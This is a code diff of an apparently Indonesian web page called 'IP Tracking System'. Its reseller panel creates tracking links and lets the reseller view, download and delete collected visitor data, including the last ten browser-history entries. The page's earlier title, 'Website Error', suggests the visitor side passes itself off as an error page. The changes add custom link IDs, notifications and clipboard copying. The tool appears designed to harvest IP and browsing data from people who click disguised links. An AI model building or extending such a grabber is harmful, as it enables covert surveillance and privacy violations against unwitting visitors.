@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Website Error</title>
+    <title>IP Tracking System</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
     <style>
@@ -190,8 +190,10 @@
             background-color: var(--grey-color);
             padding: 20px;
             border-radius: 8px;
-            width: 400px;
+            width: 500px;
             max-width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
         }
         
         .modal-header {
@@ -328,10 +330,48 @@
         .history-item {
             padding: 5px;
             border-bottom: 1px solid var(--light-grey);
+            font-size: 12px;
         }
         
         .history-item:last-child {
             border-bottom: none;
+        }
+        
+        .custom-link-form {
+            margin-top: 15px;
+            padding: 15px;
+            background-color: var(--darker-color);
+            border-radius: 4px;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px;
+            border-radius: 4px;
+            background-color: var(--primary-color);
+            color: white;
+            z-index: 1001;
+            display: none;
+        }
+        
+        .link-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            background-color: var(--darker-color);
+            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+        
+        .link-url {
+            flex-grow: 1;
+            margin-right: 10px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
         }
     </style>
 </head>
@@ -340,9 +380,9 @@
         <!-- Header untuk Reseller -->
         <header id="resellerHeader" class="hidden">
             <div class="container header-content">
-                <div class="logo">i don't know</div>
+                <div class="logo">IP Tracking Reseller</div>
                 <div id="authButtons" class="auth-buttons">
-                    <button class="btn btn-primary" onclick="showLoginModal()">Login</button>
+                    <button class="btn btn-primary" onclick="showLoginPage()">Login Reseller</button>
                 </div>
                 <div id="userInfo" class="user-info" style="display: none;">
                     <span class="welcome-text" id="welcomeText"></span>
@@ -354,7 +394,7 @@
         <!-- Halaman Login Reseller -->
         <div id="loginPage" class="login-container hidden">
             <div class="login-form">
-                <h2 class="login-title">Login</h2>
+                <h2 class="login-title">Reseller Login</h2>
                 <div class="form-group">
                     <label for="loginUsername">Username</label>
                     <input type="text" id="loginUsername" class="form-control" placeholder="Masukkan username">
@@ -371,29 +411,27 @@
         <div id="resellerPage" class="container hidden">
             <div class="admin-section">
                 <h2 class="section-title">Buat Link Tracking Baru</h2>
+                <div class="form-group">
+                    <label for="customLink">Custom Link (opsional)</label>
+                    <input type="text" id="customLink" class="form-control" placeholder="contoh: mylink">
+                    <small>Jika dikosongkan, akan dibuatkan link acak</small>
+                </div>
                 <button class="btn btn-primary" onclick="createTrackingLink()">Buat Link Baru</button>
+                
                 <div id="newLink" class="form-group" style="margin-top: 15px; display: none;">
                     <label>Link Tracking Baru:</label>
-                    <input type="text" id="trackingLink" class="form-control" readonly>
-                    <button class="btn btn-success" style="margin-top: 10px;" onclick="copyLink()">Salin Link</button>
+                    <div class="link-item">
+                        <span class="link-url" id="trackingLink"></span>
+                        <button class="btn btn-success btn-sm" onclick="copyLink()">Salin</button>
+                    </div>
                 </div>
             </div>
             
             <div class="admin-section">
                 <h2 class="section-title">Daftar Link Tracking</h2>
-                <table id="linksTable">
-                    <thead>
-                        <tr>
-                            <th>Link ID</th>
-                            <th>Dibuat Pada</th>
-                            <th>Jumlah Pengunjung</th>
-                            <th>Aksi</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <!-- Data akan diisi secara dinamis -->
-                    </tbody>
-                </table>
+                <div id="linksContainer">
+                    <!-- Link akan ditampilkan di sini -->
+                </div>
             </div>
             
             <div class="admin-section">
@@ -440,6 +478,9 @@
                 </div>
             </div>
         </div>
+        
+        <!-- Notifikasi -->
+        <div id="notification" class="notification"></div>
     </div>
 
     <script>
@@ -501,6 +542,18 @@
         // Tampilkan halaman pengunjung
         function showVisitorPage() {
             document.getElementById('visitorPage').classList.remove('hidden');
+        }
+        
+        // Tampilkan notifikasi
+        function showNotification(message, isSuccess = true) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.backgroundColor = isSuccess ? '#4caf50' : '#f44336';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
         }
         
         // Cek status login reseller
@@ -619,37 +672,63 @@
                 return;
             }
             
-            const linkId = generateLinkId();
+            const customLink = document.getElementById('customLink').value;
+            const linkId = customLink || generateLinkId();
+            
+            // Validasi link ID
+            if (!/^[a-zA-Z0-9_-]+$/.test(linkId)) {
+                alert('Link ID hanya boleh mengandung huruf, angka, underscore (_), dan dash (-)');
+                return;
+            }
+            
             const linkData = {
                 createdAt: new Date().toISOString(),
-                resellerId: currentReseller.id
+                resellerId: currentReseller.id,
+                customLink: customLink !== ''
             };
             
-            // Simpan ke database
-            database.ref(`resellers/${currentReseller.id}/links/${linkId}`).set(linkData)
-                .then(() => {
-                    const trackingLink = `${window.location.origin}${window.location.pathname}?reseller=${currentReseller.id}&link=${linkId}`;
-                    document.getElementById('trackingLink').value = trackingLink;
-                    document.getElementById('newLink').style.display = 'block';
-                    loadResellerLinks();
-                })
-                .catch((error) => {
-                    console.error('Error creating tracking link:', error);
-                    alert('Terjadi kesalahan saat membuat link');
+            // Cek apakah link ID sudah ada
+            database.ref(`resellers/${currentReseller.id}/links/${linkId}`).once('value')
+                .then((snapshot) => {
+                    if (snapshot.exists()) {
+                        alert('Link ID sudah digunakan. Silakan gunakan ID yang berbeda.');
+                        return;
+                    }
+                    
+                    // Simpan ke database
+                    database.ref(`resellers/${currentReseller.id}/links/${linkId}`).set(linkData)
+                        .then(() => {
+                            const trackingLink = `${window.location.origin}${window.location.pathname}?reseller=${currentReseller.id}&link=${linkId}`;
+                            document.getElementById('trackingLink').textContent = trackingLink;
+                            document.getElementById('newLink').style.display = 'block';
+                            document.getElementById('customLink').value = '';
+                            
+                            showNotification('Link berhasil dibuat');
+                            loadResellerLinks();
+                        })
+                        .catch((error) => {
+                            console.error('Error creating tracking link:', error);
+                            alert('Terjadi kesalahan saat membuat link');
+                        });
                 });
         }
         
         // Generate ID unik untuk link
         function generateLinkId() {
-            return Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 10);
+            return Math.random().toString(36).substring(2, 10);
         }
         
         // Salin link ke clipboard
         function copyLink() {
-            const linkInput = document.getElementById('trackingLink');
-            linkInput.select();
-            document.execCommand('copy');
-            alert('Link berhasil disalin');
+            const linkText = document.getElementById('trackingLink').textContent;
+            navigator.clipboard.writeText(linkText)
+                .then(() => {
+                    showNotification('Link berhasil disalin');
+                })
+                .catch((error) => {
+                    console.error('Error copying text: ', error);
+                    alert('Gagal menyalin link');
+                });
         }
         
         // Muat daftar link reseller
@@ -659,35 +738,30 @@
             database.ref(`resellers/${currentReseller.id}/links`).once('value')
                 .then((snapshot) => {
                     const links = snapshot.val();
-                    const tableBody = document.querySelector('#linksTable tbody');
-                    tableBody.innerHTML = '';
+                    const linksContainer = document.getElementById('linksContainer');
+                    linksContainer.innerHTML = '';
                     
                     if (!links) {
-                        tableBody.innerHTML = '<tr><td colspan="4" style="text-align: center;">Belum ada link tracking</td></tr>';
+                        linksContainer.innerHTML = '<p>Belum ada link tracking</p>';
                         return;
                     }
                     
                     Object.keys(links).forEach((linkId) => {
                         const link = links[linkId];
-                        const row = document.createElement('tr');
+                        const linkElement = document.createElement('div');
+                        linkElement.className = 'link-item';
                         
-                        // Hitung jumlah pengunjung untuk link ini
-                        database.ref(`resellers/${currentReseller.id}/links/${linkId}/visitors`).once('value')
-                            .then((visitorSnapshot) => {
-                                const visitorCount = visitorSnapshot.exists() ? Object.keys(visitorSnapshot.val()).length : 0;
-                                
-                                row.innerHTML = `
-                                    <td>${linkId}</td>
-                                    <td>${new Date(link.createdAt).toLocaleDateString('id-ID')}</td>
-                                    <td>${visitorCount} pengunjung</td>
-                                    <td class="action-buttons">
-                                        <button class="btn btn-sm btn-primary" onclick="loadLinkVisitors('${linkId}')">Lihat Data</button>
-                                        <button class="btn btn-sm btn-danger" onclick="deleteLink('${linkId}')">Hapus</button>
-                                    </td>
-                                `;
-                                
-                                tableBody.appendChild(row);
-                            });
+                        const trackingLink = `${window.location.origin}${window.location.pathname}?reseller=${currentReseller.id}&link=${linkId}`;
+                        
+                        linkElement.innerHTML = `
+                            <span class="link-url">${trackingLink}</span>
+                            <div class="action-buttons">
+                                <button class="btn btn-sm btn-primary" onclick="loadLinkVisitors('${linkId}')">Lihat Data</button>
+                                <button class="btn btn-sm btn-danger" onclick="deleteLink('${linkId}')">Hapus</button>
+                            </div>
+                        `;
+                        
+                        linksContainer.appendChild(linkElement);
                     });
                 })
                 .catch((error) => {
@@ -743,7 +817,7 @@
             
             database.ref(`resellers/${currentReseller.id}/links/${linkId}`).remove()
                 .then(() => {
-                    alert('Link berhasil dihapus');
+                    showNotification('Link berhasil dihapus');
                     loadResellerLinks();
                     
                     // Jika link yang sedang dilihat dihapus, kosongkan tabel pengunjung
@@ -769,7 +843,7 @@
             
             database.ref(`resellers/${currentReseller.id}/links/${currentLinkId}/visitors/${visitorKey}`).remove()
                 .then(() => {
-                    alert('Data pengunjung berhasil dihapus');
+                    showNotification('Data pengunjung berhasil dihapus');
                     loadLinkVisitors(currentLinkId);
                 })
                 .catch((error) => {
@@ -822,14 +896,12 @@
                     if (visitor.browserHistory && visitor.browserHistory.length > 0) {
                         detailsHTML += `
                             <div class="info-item">
-                                <span class="info-label">Riwayat Browser:</span>
+                                <span class="info-label">Riwayat Browser (10 terakhir):</span>
                                 <div class="history-list">
                         `;
                         
-                        visitor.browserHistory.forEach((item, index) => {
-                            if (index < 10) { // Tampilkan maksimal 10 item
-                                detailsHTML += `<div class="history-item">${item}</div>`;
-                            }
+                        visitor.browserHistory.slice(-10).forEach((item) => {
+                            detailsHTML += `<div class="history-item">${item}</div>`;
                         });
                         
                         detailsHTML += `
@@ -881,10 +953,8 @@
                     
                     if (visitor.browserHistory && visitor.browserHistory.length > 0) {
                         textData += `\nRiwayat Browser:\n`;
-                        visitor.browserHistory.forEach((item, index) => {
-                            if (index < 10) {
-                                textData += `- ${item}\n`;
-                            }
+                        visitor.browserHistory.slice(-10).forEach((item) => {
+                            textData += `- ${item}\n`;
                         });
                     }
                     
@@ -899,6 +969,8 @@
                     a.click();
                     document.body.removeChild(a);
                     URL.revokeObjectURL(url);
+                    
+                    showNotification('Data berhasil diunduh');
                 })
                 .catch((error) => {
                     console.error('Error downloading visitor data:', error);
@@ -915,7 +987,7 @@
             
             database.ref(`resellers/${currentReseller.id}/links/${currentLinkId}/visitors/${currentVisitorKey}`).remove()
                 .then(() => {
-                    alert('Data pengunjung berhasil dihapus');
+                    showNotification('Data pengunjung berhasil dihapus');
                     closeVisitorModal();
                     loadLinkVisitors(currentLinkId);
                 })
